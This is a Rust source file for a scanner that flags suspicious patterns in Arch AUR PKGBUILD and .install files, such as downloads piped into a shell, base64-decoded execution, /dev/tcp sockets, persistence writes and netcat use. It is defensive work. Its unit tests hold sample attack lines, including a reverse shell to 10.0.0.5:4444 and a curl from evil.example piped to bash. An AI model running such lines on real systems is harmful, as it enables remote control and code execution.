//! Heuristic PKGBUILD safety scanner (pure, unit-testable).
//!
//! AUR packages are arbitrary shell scripts run on your machine. The recent
//! mass AUR compromise (hundreds of packages backdoored) and the nvim RCE show
//! how a malicious `PKGBUILD` / `.install` file can pull and execute remote
//! payloads at build/install time. This scanner flags the patterns those
//! attacks rely on. It is intentionally conservative and reports *suspicion*,
//! not proof - a human still reviews the findings.

/// Severity of a finding.
#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    pub fn marker(self) -> &'static str {
        match self {
            Severity::High => "HIGH",
            Severity::Medium => "MED ",
            Severity::Low => "LOW ",
        }
    }
}

/// A single suspicious pattern match.
#[derive(Debug, Clone)]
pub struct Finding {
    pub severity: Severity,
    pub line: usize,
    pub rule: &'static str,
    pub excerpt: String,
}

/// Scan a PKGBUILD (or .install) body and return findings, ordered by line.
pub fn scan_pkgbuild(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    for (i, raw) in content.lines().enumerate() {
        let line_no = i + 1;
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let lower = line.to_lowercase();

        // --- HIGH: piping a network download straight into a shell ---
        if is_download_pipe_to_shell(&lower) {
            push(
                &mut findings,
                Severity::High,
                line_no,
                "download-pipe-to-shell",
                raw,
            );
        }

        // --- HIGH: eval of command substitution (often hides a fetch) ---
        if lower.contains("eval ") && (lower.contains("$(") || lower.contains('`')) {
            push(
                &mut findings,
                Severity::High,
                line_no,
                "eval-command-substitution",
                raw,
            );
        }

        // --- HIGH: base64-decoded payload executed ---
        if lower.contains("base64")
            && (lower.contains("-d") || lower.contains("--decode"))
            && (lower.contains("|") && (lower.contains("sh") || lower.contains("bash")))
        {
            push(
                &mut findings,
                Severity::High,
                line_no,
                "base64-decode-exec",
                raw,
            );
        }

        // --- HIGH: bash /dev/tcp reverse-shell primitive ---
        if lower.contains("/dev/tcp/") {
            push(
                &mut findings,
                Severity::High,
                line_no,
                "dev-tcp-socket",
                raw,
            );
        }

        // --- HIGH: writes into shell rc / autostart / cron (persistence) ---
        if mentions_persistence(&lower) {
            push(
                &mut findings,
                Severity::High,
                line_no,
                "persistence-target",
                raw,
            );
        }

        // --- HIGH/MED: installing a *named* package from a public registry
        // during build/install (the npm `atomic-lockfile` / bun `js-digest`
        // AUR supply-chain vector). Bare `npm install` (declared deps) is not
        // flagged - only an explicit package-name argument. ---
        if let Some((sev, rule)) = detect_registry_install(&lower) {
            push(&mut findings, sev, line_no, rule, raw);
        }

        // --- MEDIUM: raw netcat usage ---
        if word_present(&lower, "nc") || lower.contains("netcat") || lower.contains("ncat") {
            push(
                &mut findings,
                Severity::Medium,
                line_no,
                "netcat-usage",
                raw,
            );
        }

        // --- MEDIUM: hardcoded IPv4 literal in a URL/connection ---
        if contains_ip_literal(line) {
            push(
                &mut findings,
                Severity::Medium,
                line_no,
                "hardcoded-ip",
                raw,
            );
        }

        // --- MEDIUM: curl/wget to a non-pinned location during build/package ---
        if (lower.contains("curl ") || lower.contains("wget "))
            && (lower.contains("http://") || lower.contains("https://"))
        {
            push(
                &mut findings,
                Severity::Medium,
                line_no,
                "network-fetch",
                raw,
            );
        }

        // --- LOW: sudo invoked from within the PKGBUILD ---
        if word_present(&lower, "sudo") {
            push(&mut findings, Severity::Low, line_no, "sudo-in-build", raw);
        }

        // --- LOW: chmod +x then immediate execution of a fetched file ---
        if lower.contains("chmod") && lower.contains("+x") {
            push(
                &mut findings,
                Severity::Low,
                line_no,
                "chmod-executable",
                raw,
            );
        }
    }
    findings
}

/// Count findings at or above HIGH severity.
pub fn high_count(findings: &[Finding]) -> usize {
    findings
        .iter()
        .filter(|f| f.severity == Severity::High)
        .count()
}

fn push(out: &mut Vec<Finding>, severity: Severity, line: usize, rule: &'static str, raw: &str) {
    out.push(Finding {
        severity,
        line,
        rule,
        excerpt: raw.trim().chars().take(120).collect(),
    });
}

fn is_download_pipe_to_shell(lower: &str) -> bool {
    let has_fetch = lower.contains("curl") || lower.contains("wget");
    if !has_fetch || !lower.contains('|') {
        return false;
    }
    // Something after a pipe runs a shell.
    lower.split('|').skip(1).any(|seg| {
        let s = seg.trim_start();
        s.starts_with("sh") || s.starts_with("bash") || s.starts_with("zsh") || s.contains("sh -")
    })
}

fn mentions_persistence(lower: &str) -> bool {
    const TARGETS: [&str; 7] = [
        ".bashrc",
        ".zshrc",
        ".profile",
        "autostart",
        "crontab",
        "/etc/cron",
        "systemd/user",
    ];
    // Only flag when combined with a write/append redirection or install.
    let writes = lower.contains(">>")
        || lower.contains('>')
        || lower.contains("tee ")
        || lower.contains("install ");
    writes && TARGETS.iter().any(|t| lower.contains(t))
}

fn word_present(lower: &str, word: &str) -> bool {
    lower
        .split(|c: char| !c.is_ascii_alphanumeric())
        .any(|w| w == word)
}

/// Detect an IPv4 literal (rough: four dot-separated 1-3 digit groups).
fn contains_ip_literal(line: &str) -> bool {
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i].is_ascii_digit() {
            let start = i;
            let mut groups = 1;
            let mut digits = 0;
            while i < bytes.len() {
                if bytes[i].is_ascii_digit() {
                    digits += 1;
                    i += 1;
                } else if bytes[i] == b'.' && digits > 0 && digits <= 3 {
                    groups += 1;
                    digits = 0;
                    i += 1;
                } else {
                    break;
                }
            }
            if groups == 4 && (1..=3).contains(&digits) {
                // Avoid matching version-like prefixes immediately followed by more dots/digits.
                let end = i;
                let after_ok = end >= bytes.len() || !bytes[end].is_ascii_digit();
                if after_ok && start < end {
                    return true;
                }
            }
        } else {
            i += 1;
        }
    }
    false
}

/// Detect a package-manager command that pulls a *named* package from a public
/// registry (npm/bun/pnpm/yarn/pip/cargo/go/gem). Returns `(severity, rule)`,
/// or `None` if absent. JavaScript registries are HIGH (the documented June
/// 2026 AUR `atomic-lockfile`/`js-digest` vector); others are MEDIUM. A bare
/// `npm install` with no package argument installs declared dependencies and
/// is intentionally NOT flagged.
fn detect_registry_install(lower: &str) -> Option<(Severity, &'static str)> {
    let tokens: Vec<&str> = lower.split_whitespace().collect();
    for (i, tok) in tokens.iter().enumerate() {
        let pm = tok.trim_start_matches(|c: char| !c.is_ascii_alphanumeric());
        let (high, subcmds): (bool, &[&str]) = match pm {
            "npm" | "pnpm" | "bun" => (true, &["install", "i", "add"]),
            "yarn" => (true, &["add"]),
            "pip" | "pip3" => (false, &["install"]),
            "cargo" => (false, &["install"]),
            "go" => (false, &["install", "get"]),
            "gem" => (false, &["install"]),
            _ => continue,
        };
        let Some(sub) = tokens.get(i + 1) else {
            continue;
        };
        if !subcmds.contains(sub) {
            continue;
        }
        if has_named_package_arg(&tokens[i + 2..]) {
            return if high {
                Some((Severity::High, "registry-install-js"))
            } else {
                Some((Severity::Medium, "registry-install"))
            };
        }
    }
    None
}

/// True if any argument looks like a registry package name (not a flag, path,
/// shell variable, or a manifest like `package.json`).
fn has_named_package_arg(rest: &[&str]) -> bool {
    rest.iter().any(|a| {
        let a = a.trim();
        !a.is_empty()
            && !a.starts_with('-')
            && !a.starts_with("./")
            && !a.starts_with('/')
            && !a.starts_with('$')
            && a != "."
            && !a.ends_with(".json")
    })
}

/// Extract the `install=` hook filename from a PKGBUILD, if statically known.
/// Returns `None` when unset or when the value depends on a shell variable
/// (callers may fall back to `<pkg>.install`).
pub fn parse_install_field(pkgbuild: &str) -> Option<String> {
    for raw in pkgbuild.lines() {
        let line = raw.trim();
        if let Some(rest) = line.strip_prefix("install=") {
            let val = rest.trim().trim_matches(|c| c == '"' || c == '\'');
            if val.is_empty() || val.contains('$') {
                return None;
            }
            return Some(val.to_string());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_curl_pipe_bash() {
        let pb = "build() {\n  curl -fsSL https://evil.example/x.sh | bash\n}\n";
        let f = scan_pkgbuild(pb);
        assert!(
            f.iter()
                .any(|x| x.rule == "download-pipe-to-shell" && x.severity == Severity::High)
        );
    }

    #[test]
    fn flags_dev_tcp_reverse_shell() {
        let pb = "package() {\n  bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n}\n";
        let f = scan_pkgbuild(pb);
        assert!(f.iter().any(|x| x.rule == "dev-tcp-socket"));
        // IP literal should also be flagged.
        assert!(f.iter().any(|x| x.rule == "hardcoded-ip"));
    }

    #[test]
    fn flags_base64_decode_exec() {
        let pb = "echo aGVsbG8= | base64 -d | bash\n";
        let f = scan_pkgbuild(pb);
        assert!(f.iter().any(|x| x.rule == "base64-decode-exec"));
    }

    #[test]
    fn flags_persistence_write() {
        let pb = "echo 'curl evil|sh' >> ~/.bashrc\n";
        let f = scan_pkgbuild(pb);
        assert!(f.iter().any(|x| x.rule == "persistence-target"));
    }

    #[test]
    fn clean_pkgbuild_has_no_high_findings() {
        let pb = "\
pkgname=hello
pkgver=1.0
source=(\"https://ftp.gnu.org/gnu/hello/hello-1.0.tar.gz\")
build() {
  cd \"$srcdir/hello-1.0\"
  ./configure --prefix=/usr
  make
}
package() {
  cd \"$srcdir/hello-1.0\"
  make DESTDIR=\"$pkgdir\" install
}
";
        let f = scan_pkgbuild(pb);
        assert_eq!(high_count(&f), 0, "unexpected high findings: {f:?}");
    }

    #[test]
    fn ip_detector_ignores_versions() {
        assert!(!contains_ip_literal("pkgver=1.2.3"));
        assert!(contains_ip_literal("connect 192.168.1.50 now"));
    }

    #[test]
    fn flags_npm_install_named_package() {
        let pb = "package() {\n  npm install atomic-lockfile\n}\n";
        let f = scan_pkgbuild(pb);
        assert!(
            f.iter()
                .any(|x| x.rule == "registry-install-js" && x.severity == Severity::High)
        );
    }

    #[test]
    fn flags_bun_install_named_package() {
        let f = scan_pkgbuild("  bun install js-digest\n");
        assert!(f.iter().any(|x| x.rule == "registry-install-js"));
    }

    #[test]
    fn ignores_bare_npm_install() {
        // `npm install` with no package installs declared deps - legitimate.
        let f = scan_pkgbuild("build() {\n  npm install\n  npm ci\n}\n");
        assert!(!f.iter().any(|x| x.rule.starts_with("registry-install")));
    }

    #[test]
    fn pip_install_is_medium() {
        let f = scan_pkgbuild("pip install requests\n");
        assert!(
            f.iter()
                .any(|x| x.rule == "registry-install" && x.severity == Severity::Medium)
        );
    }

    #[test]
    fn parses_install_field() {
        assert_eq!(
            parse_install_field("pkgname=foo\ninstall=foo.install\n"),
            Some("foo.install".to_string())
        );
        assert_eq!(
            parse_install_field("install=\"bar.install\"\n"),
            Some("bar.install".to_string())
        );
        // Variable-based name cannot be resolved statically.
        assert_eq!(parse_install_field("install=${pkgname}.install\n"), None);
        assert_eq!(parse_install_field("pkgname=foo\n"), None);
    }
}
